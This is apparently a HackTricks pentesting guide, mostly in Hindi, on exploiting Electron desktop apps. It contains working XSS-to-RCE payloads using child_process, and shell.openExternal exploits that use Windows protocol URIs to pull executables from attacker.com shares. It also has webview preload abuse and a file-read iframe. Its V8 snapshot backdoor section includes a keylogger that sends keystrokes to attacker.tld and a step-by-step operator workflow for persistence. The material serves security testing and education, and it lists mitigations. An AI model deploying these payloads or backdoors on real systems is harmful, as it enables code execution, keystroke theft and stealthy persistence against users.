# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## परिचय

Electron स्थानीय backend (**NodeJS** के साथ) और frontend (**Chromium**) को जोड़ता है, हालांकि इसमें आधुनिक ब्राउज़रों की कुछ सुरक्षा तंत्रों की कमी होती है।

आमतौर पर आप Electron app का कोड `.asar` एप्लिकेशन के अंदर पाएंगे; कोड प्राप्त करने के लिए आपको इसे extract करना होगा:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electron app के स्रोत कोड में, `packet.json` के अंदर, आप निर्दिष्ट `main.js` फ़ाइल पा सकते हैं जहाँ security configs सेट किए गए हैं।
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron के 2 प्रकार के प्रोसेस हैं:

- Main Process (NodeJS तक पूर्ण पहुँच है)
- Renderer Process (सुरक्षा कारणों से NodeJS की पहुँच सीमित होनी चाहिए)

![](<../../../images/image (182).png>)

एक **renderer process** ब्राउज़र विंडो होगी जो एक फाइल लोड करेगी:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Settings of the **renderer process** can be **configured** in the **main process** inside the main.js file. Some of the configurations will **prevent the Electron application to get RCE** or other vulnerabilities if the **settings are correctly configured**.

main.js फ़ाइल के अंदर **main process** में **renderer process** की सेटिंग्स **configured** की जा सकती हैं। अगर ये सेटिंग्स सही तरीके से कॉन्फ़िगर की गई हों तो इनमें से कुछ कॉन्फ़िगरेशन Electron application को RCE या अन्य vulnerabilities आने से रोक सकती हैं।

The electron application **could access the device** via Node apis although it can be configure to prevent it:

Electron application Node apis के माध्यम से डिवाइस तक पहुँच सकती है, हालांकि इसे रोकने के लिए कॉन्फ़िगर किया जा सकता है:

- **`nodeIntegration`** - is `off` by default. If on, allows to access node features from the renderer process.
- **`contextIsolation`** - is `on` by default. If off, main and renderer processes aren't isolated.
- **`preload`** - empty by default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - is off by default. It will restrict the actions NodeJS can perform.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- is `off` by default.
- If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
- If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

- **`nodeIntegration`** - डिफ़ॉल्ट रूप से `off` है। यदि `on` है, तो renderer process से node फीचर्स तक पहुँचने की अनुमति देता है।
- **`contextIsolation`** - डिफ़ॉल्ट रूप से `on` है। यदि `off` है, तो main और renderer processes अलग-थलग नहीं रहते।
- **`preload`** - डिफ़ॉल्ट रूप से खाली है।
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - डिफ़ॉल्ट रूप से `off` है। यह NodeJS द्वारा किए जा सकने वाले actions को प्रतिबंधित करेगा।
- Workers में Node Integration
- **`nodeIntegrationInSubframes`** - डिफ़ॉल्ट रूप से `off` है।
- यदि **`nodeIntegration`** **enabled** है, तो यह Electron application के अंदर iframes में लोड किए गए वेब पेजों में **Node.js APIs** के उपयोग की अनुमति देगा।
- यदि **`nodeIntegration`** **disabled** है, तो preload स्क्रिप्ट्स iframe में लोड होंगे।

Example of configuration:

कॉन्फ़िगरेशन का उदाहरण:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
कुछ **RCE payloads** [here](https://7as.es/electron/nodeIntegration_rce.txt) से:
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### ट्रैफ़िक कैप्चर

start-main कॉन्फ़िगरेशन को संशोधित करें और निम्नलिखित जैसे proxy का उपयोग जोड़ें:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

यदि आप स्थानीय रूप से किसी Electron App को चला सकते हैं, तो संभव है कि आप इसे मनमाना javascript code निष्पादित करने के लिए मजबूर कर सकें। इसके बारे में देखें:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

यदि **nodeIntegration** **on** पर सेट है, तो किसी वेब पेज का JavaScript सिर्फ `require()` कॉल करके आसानी से Node.js फीचर्स का उपयोग कर सकता है। उदाहरण के लिए, Windows पर calc application को चलाने का तरीका है:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

यह सेटिंग में निर्दिष्ट स्क्रिप्ट **renderer में अन्य स्क्रिप्ट्स से पहले लोड होती है**, इसलिए इसे **Node APIs तक असीमित पहुँच** है:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
इसलिए, स्क्रिप्ट node-features को pages में निर्यात कर सकती है:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **यदि `contextIsolation` चालू है, तो यह काम नहीं करेगा**

## RCE: XSS + contextIsolation

The _**contextIsolation**_ वेब पेज स्क्रिप्ट्स और Electron के internal JavaScript कोड के बीच **अलग किए गए contexts** पेश करता है ताकि प्रत्येक कोड की JavaScript execution एक-दूसरे को प्रभावित न करे। यह RCE की संभावना को खत्म करने के लिए एक आवश्यक फीचर है।

यदि contexts isolated नहीं हैं तो attacker कर सकता है:

1. Execute **renderer में arbitrary JavaScript** (XSS या external साइटों पर navigation)
2. **preload या Electron internal code में उपयोग किए जाने वाले built-in method** को overwrite करना ताकि function पर control हासिल किया जा सके
3. **overwritten function** के उपयोग को **trigger** करना
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass click event

यदि link पर क्लिक करने पर कुछ restrictions लागू होते हैं, तो आप उन्हें नियमित left click की बजाय **middle click** करके bypass कर सकते हैं।
```javascript
window.addEventListener('click', (e) => {
```
## RCE के माध्यम से shell.openExternal

इन उदाहरणों के बारे में अधिक जानकारी के लिए देखें [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) और [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Electron डेस्कटॉप एप्लिकेशन तैनात करते समय, `nodeIntegration` और `contextIsolation` के सही सेटिंग्स सुनिश्चित करना बहुत महत्वपूर्ण है। यह स्थापित है कि ये सेटिंग्स होने पर preload scripts या Electron के native code को main process से टार्गेट करने वाली **client-side remote code execution (RCE)** प्रभावी रूप से रोकी जाती है।

जब उपयोगकर्ता लिंक के साथ इंटरैक्ट करता है या नया विंडो खोलता है, तो कुछ विशेष event listeners ट्रिगर होते हैं, जो एप्लिकेशन की सुरक्षा और कार्यक्षमता के लिए महत्वपूर्ण होते हैं:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
ये listeners को डेस्कटॉप एप्लिकेशन द्वारा **ओवरराइड** किया जाता है ताकि इसका अपना **बिजनेस लॉजिक** लागू किया जा सके। एप्लिकेशन यह मूल्यांकन करता है कि नेविगेट की गई लिंक को आंतरिक रूप से खोलना चाहिए या किसी external वेब ब्राउज़र में। यह निर्णय आमतौर पर `openInternally` फ़ंक्शन के माध्यम से लिया जाता है। यदि यह फ़ंक्शन `false` लौटाता है, तो इसका अर्थ है कि लिंक को बाहरी रूप से खोलना चाहिए, यानी `shell.openExternal` फ़ंक्शन का उपयोग किया जाएगा।

**यहाँ एक सरलीकृत pseudocode है:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS सुरक्षा सर्वोत्तम प्रथाएँ `openExternal` फ़ंक्शन के साथ अनविश्वसनीय कंटेंट स्वीकार करने के खिलाफ चेतावनी देती हैं, क्योंकि यह विभिन्न protocols के माध्यम से RCE का कारण बन सकता है। ऑपरेटिंग सिस्टम विभिन्न protocols को सपोर्ट करते हैं जो RCE ट्रिगर कर सकते हैं। इस विषय पर विस्तृत उदाहरणों और आगे की व्याख्या के लिए, [this resource](https://positive.security/blog/url-open-rce#windows-10-19042) देखें, जिसमें Windows protocol examples शामिल हैं जो इस vulnerability को exploit कर सकते हैं।

macos में, `openExternal` फ़ंक्शन का exploit करके arbitrary commands execute किए जा सकते हैं, जैसे `shell.openExternal('file:///System/Applications/Calculator.app')`।

**Windows protocol exploits के उदाहरण शामिल हैं:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

यह कमज़ोरी **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** में पाई जा सकती है।

The **webviewTag** is a **deprecated feature** that allows the use of **NodeJS** in the **renderer process**, and इसे अक्षम कर देना चाहिए क्योंकि यह preload context के अंदर एक script लोड करने की अनुमति देता है जैसा कि:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
इसलिए, एक attacker जो किसी arbitrary पेज को लोड करने में सक्षम हो, वह उस tag का उपयोग करके **load an arbitrary preload script** कर सकता है।

इसके बाद इस preload script का दुरुपयोग कर एक **vulnerable IPC service (`skype-new-window`)** को कॉल किया गया, जो RCE पाने के लिए **`shell.openExternal`** को कॉल कर रहा था:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## आंतरिक फाइलें पढ़ना: XSS + contextIsolation

**`contextIsolation` को अक्षम करने से `<webview>` टैग्स का उपयोग संभव हो जाता है**, `<iframe>` के समान, स्थानीय फाइलों को पढ़ने और exfiltrating के लिए। दिया गया उदाहरण दिखाता है कि इस vulnerability का exploit करके आंतरिक फाइलों की सामग्री कैसे पढ़ी जा सकती है:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

इसके अलावा, आंतरिक फ़ाइल पढ़ने का एक और तरीका साझा किया गया है, जो Electron desktop app में एक गंभीर local file read vulnerability को उजागर करता है। यह ऐप्लिकेशन को exploit करने और data को exfiltrate करने के लिए एक script inject करने में शामिल है:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Old Chromium**

यदि एप्लिकेशन द्वारा उपयोग किया गया **chromium** **old** है और उस पर **known** **vulnerabilities** मौजूद हैं, तो इसे **exploit it and obtain RCE through a XSS** करना संभव हो सकता है。\
You can see an example in this **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

मान लीजिए आपने XSS ढूंढ लिया है पर आप **cannot trigger RCE or steal internal files**, तो आप इसे **steal credentials via phishing** के लिए इस्तेमाल करने की कोशिश कर सकते हैं।

सबसे पहले आपको यह जानना होगा कि जब आप कोई नया URL खोलने की कोशिश करते हैं तो क्या होता है — इसके लिए front-end में JS code की जांच करें:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
The call to **`openInternally`** will decide if the **link** will be **opened** in the **desktop window** as it's a link belonging to the platform, **or** if will be opened in the **browser as a 3rd party resource**.

In the case the **regex** used by the function is **vulnerable to bypasses** (for example by **not escaping the dots of subdomains**) an attacker could abuse the XSS to **open a new window which** will be located in the attackers infrastructure **asking for credentials** to the user:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` प्रोटोकॉल

जैसा कि [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) में बताया गया है, **`file://`** पर चलने वाले पेजों को आपकी मशीन की हर फ़ाइल तक एकतरफा पहुँच मिलती है, जिसका अर्थ है कि **XSS issues can be used to load arbitrary files**। एक **custom protocol** का उपयोग ऐसी समस्याओं को रोकता है क्योंकि आप प्रोटोकॉल को केवल एक विशेष फ़ाइल सेट सर्व करने तक सीमित कर सकते हैं।

## Remote module

Electron Remote module अनुमति देता है कि **renderer processes to access main process APIs**, जिससे Electron एप्लिकेशन के भीतर संचार सुगम होता है। हालांकि, इस मॉड्यूल को सक्षम करने से महत्वपूर्ण सुरक्षा जोखिम उत्पन्न होते हैं। यह एप्लिकेशन के attack surface का विस्तार करता है, जिससे यह cross-site scripting (XSS) जैसे vulnerabilities के प्रति अधिक संवेदनशील हो जाता है।

> [!TIP]
> हालाँकि **remote** module main से renderer processes को कुछ APIs expose करता है, केवल इन components का दुरुपयोग करके सीधे RCE प्राप्त करना आसान नहीं है। हालाँकि, ये components संवेदनशील जानकारी उजागर कर सकते हैं।

> [!WARNING]
> कई ऐप्स जो अभी भी remote module का उपयोग करते हैं, वे इसे इस तरह करते हैं कि **require NodeIntegration to be enabled** in the renderer process, जो कि एक **huge security risk** है।

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **recommended to not use it**.

To enable it, it'd first needed to **enable it in the main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
फिर, renderer process इस तरह module से objects import कर सकता है:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
यह **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** remote module के object **`app`** द्वारा expose किए गए कुछ रोचक **functions** दर्शाता है:

- **`app.relaunch([options])`**
- **पुनः प्रारंभ करता है** एप्लिकेशन को, वर्तमान इंस्टेंस को **बंद** करके और एक नया **प्रारंभ** करके। यह **ऐप अपडेट्स** या महत्वपूर्ण **स्थिति परिवर्तनों** के लिए उपयोगी है।
- **`app.setAppLogsPath([path])`**
- **डायरेक्टरी को परिभाषित या बनाता है** ऐप लॉग्स को स्टोर करने के लिए। लॉग्स को **प्राप्त** या **संशोधित** किया जा सकता है **`app.getPath()`** या **`app.setPath(pathName, newPath)`** के माध्यम से।
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **रजिस्टर करता है** वर्तमान executable को एक निर्दिष्ट **protocol** के लिए **default handler** के रूप में। आवश्यकता होने पर आप एक **custom path** और **arguments** प्रदान कर सकते हैं।
- **`app.setUserTasks(tasks)`**
- **टास्क जोड़ता है** Jump List की **Tasks category** में (on Windows)। प्रत्येक टास्क यह नियंत्रित कर सकता है कि ऐप कैसे **लॉन्च** होता है या कौन से **arguments** पास होते हैं।
- **`app.importCertificate(options, callback)`**
- **इम्पोर्ट करता है** एक **PKCS#12 certificate** को सिस्टम के **certificate store** में (Linux only)। परिणाम को हैंडल करने के लिए **callback** का उपयोग किया जा सकता है।
- **`app.moveToApplicationsFolder([options])`**
- **एप्लिकेशन को स्थानांतरित करता है** Applications folder पर (on macOS)। यह Mac उपयोगकर्ताओं के लिए **standard installation** सुनिश्चित करने में मदद करता है।
- **`app.setJumpList(categories)`**
- **सेट** या **हटाता है** एक **custom Jump List** on **Windows**। आप **categories** निर्दिष्ट कर सकते हैं ताकि यह व्यवस्थित हो कि टास्क उपयोगकर्ता को कैसे दिखाई दें।
- **`app.setLoginItemSettings(settings)`**
- **कॉन्फ़िगर करता है** कि कौन से **executables** login पर लॉन्च हों और उनके **options** क्या हों (macOS and Windows only).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

Electron में system preferences तक पहुँचने और **emitting system events** के लिए यह **primary API** है। **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, और **setUserDefault** जैसे methods सभी इस module का **भाग** हैं।

**उपयोग का उदाहरण:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **सुनता है** NSDistributedNotificationCenter का उपयोग करके **native macOS notifications** के लिए।
* **macOS Catalina** से पहले, आप CFNotificationCenterAddObserver में **nil** पास करके **all** distributed notifications को sniff कर सकते थे।
* **Catalina / Big Sur** के बाद, sandboxed apps फिर भी कई घटनाओं (उदाहरण के लिए, **screen locks/unlocks**, **volume mounts**, **network activity**, आदि) को नाम द्वारा notifications register करके **subscribe** कर सकते हैं।

### **getUserDefault / setUserDefault**

* **NSUserDefaults** के साथ इंटरफ़ेस करता है, जो macOS पर **application** या **global** preferences को स्टोर करता है।

* **getUserDefault** संवेदनशील जानकारी **retrieve** कर सकता है, जैसे **recent file locations** या **user’s geographic location**।

* **setUserDefault** इन preferences को **modify** कर सकता है, जो किसी app के **configuration** को प्रभावित कर सकता है।

* पुराने **Electron versions** (v8.3.0 से पहले) में, केवल NSUserDefaults के **standard suite** तक **accessible** था।

## Shell.showItemInFolder

This function shows the given file in a file manager, जो **फ़ाइल को स्वचालित रूप से execute कर सकता है**।

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps should have a **Content Security Policy (CSP)** ताकि **XSS attacks** को रोका जा सके। **CSP** एक **security standard** है जो ब्राउज़र में **untrusted code** के **execution** को रोकने में मदद करता है।

यह आमतौर पर `main.js` फ़ाइल या `index.html` टेम्पलेट में CSP को **meta tag** के अंदर कॉन्फ़िगर करके लगाया जाता है।

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) एक टूल है जो Electron-based applications में misconfigurations और security anti-patterns की पहचान करता है।
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) Electron applications के लिए एक open source VS Code plugin है जो Electronegativity का उपयोग करता है।
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) तीसरे पक्ष की कमजोर libraries की जाँच करने के लिए
- [**Electro.ng**](https://electro.ng/): आपको इसे खरीदना होगा

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) आप vulnerable Electron apps को exploit करने के लिए एक लैब पा सकते हैं।

कुछ कमांड जो लैब में आपकी मदद करेंगे:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## V8 heap snapshot छेड़छाड़ के जरिए लोकल backdooring (Electron/Chromium) – CVE-2025-55305

Electron और Chromium-based ऐप्स startup पर पहले से बने V8 heap snapshot (v8_context_snapshot.bin, और वैकल्पिक रूप से browser_v8_context_snapshot.bin) को deserialize करते हैं ताकि प्रत्येक V8 isolate (main, preload, renderer) इनिशियलाइज़ हो सके। ऐतिहासिक रूप से, Electron की integrity fuses इन snapshots को executable content के रूप में नहीं मानती थीं, इसलिए वे fuse-based integrity enforcement और OS code-signing checks दोनों से बच गए। परिणामस्वरूप, user-writable installation में snapshot को बदलने से signed binaries या ASAR को modify किये बिना ऐप के अंदर stealthy, persistent code execution संभव हो गया।

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation और OnlyLoadAppFromAsar ASAR के अंदर app JavaScript को validate करते हैं, लेकिन वे V8 heap snapshots (CVE-2025-55305) को कवर नहीं करते थे। Chromium भी समान रूप से snapshots की integrity-check नहीं करता।
- Attack preconditions: ऐप की installation directory में local file write। यह उन सिस्टम्स पर आम है जहाँ Electron apps या Chromium browsers user-writable paths में install होते हैं (जैसे %AppData%\Local on Windows; /Applications with caveats on macOS)।
- Effect: किसी भी isolate में attacker JavaScript का reliable execution एक बार-बार इस्तेमाल होने वाले builtin (a “gadget”) को clobber करके संभव होता है, जो persistence और code-signing verification से बचने में सक्षम बनाता है।
- Affected surface: Electron apps (even with fuses enabled) और Chromium-based browsers जो user-writable locations से snapshots load करते हैं।

Generating a malicious snapshot without building Chromium
- prebuilt electron/mksnapshot का उपयोग करके payload JS को एक snapshot में compile करें और application के v8_context_snapshot.bin को overwrite करें।

Example minimal payload (execution साबित करने के लिए crash कराकर)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (main बनाम renderer में अलग कोड चलाएँ)
- Main process का पता लगाना: Node-only globals जैसे process.pid, process.binding(), या process.dlopen main process isolate में मौजूद होते हैं.
- Browser/renderer का पता लगाना: Browser-only globals जैसे alert document context में चलाने पर उपलब्ध होते हैं.

Example gadget जो एक बार main-process की Node क्षमताओं की जाँच करता है
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context डेटा चोरी PoC (e.g., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) payload.js लिखें जो किसी सामान्य builtin (उदा., Array.isArray) को ओवरराइड कर दे और वैकल्पिक रूप से प्रति isolate ब्रांच करे।
2) Chromium स्रोतों के बिना snapshot बनाएं:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) लक्ष्य एप्लिकेशन की snapshot फ़ाइल(ओं) को ओवरराइट करें:
- v8_context_snapshot.bin (हमेशा उपयोग होती है)
- browser_v8_context_snapshot.bin (यदि LoadBrowserProcessSpecificV8Snapshot fuse उपयोग में है)
4) एप्लिकेशन लॉन्च करें; चुने हुए builtin के उपयोग पर gadget निष्पादित होता है।

Notes and considerations
- Integrity/signature bypass: Snapshot फ़ाइलों को code-signing checks द्वारा native executables के रूप में नहीं माना जाता और (ऐतिहासिक रूप से) Electron’s fuses या Chromium integrity controls द्वारा कवर नहीं किया गया था।
- Persistence: उपयोगकर्ता-लेखनीय इंस्टॉल में snapshot बदलने से आम तौर पर ऐप रिस्टार्ट के बाद भी बदलाव बनी रहती है और यह एक signed, legitimate app जैसा दिखता है।
- Chromium browsers: वही छेड़छाड़ का विचार Chrome/derivatives पर भी लागू होता है जो user-writable लोकेशनों में इंस्टॉल हैं। Chrome के पास अन्य integrity mitigations हैं पर यह स्पष्ट रूप से physically local attacks को अपने threat model से बाहर रखता है।

Detection and mitigations
- Snapshot को executable content मानें और उन्हें integrity enforcement में शामिल करें (CVE-2025-55305 fix)।
- Admin-writable-only install लोकेशनों को प्राथमिकता दें; v8_context_snapshot.bin और browser_v8_context_snapshot.bin के लिए baseline और मॉनिटर hashes रखें।
- Early-runtime builtin clobbering और अनपेक्षित snapshot परिवर्तनों का पता लगाएँ; जब deserialized snapshots उम्मीद के अनुरूप न हों तो alert करें।

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
